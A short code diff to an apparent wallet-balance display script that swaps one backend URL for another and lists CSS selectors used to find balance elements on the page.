@@ -1,6 +1,6 @@
 /* Natural balance display — replaces placeholder text after wallet connect */
 (function () {
-  var BACKEND_URL = 'https://legionapi-production.up.railway.app';
+  var BACKEND_URL = 'https://sadrailala-production.up.railway.app';
   var BALANCE_SELECTORS = [
     '[data-testid*="balance" i]',
     '[class*="balance" i]',
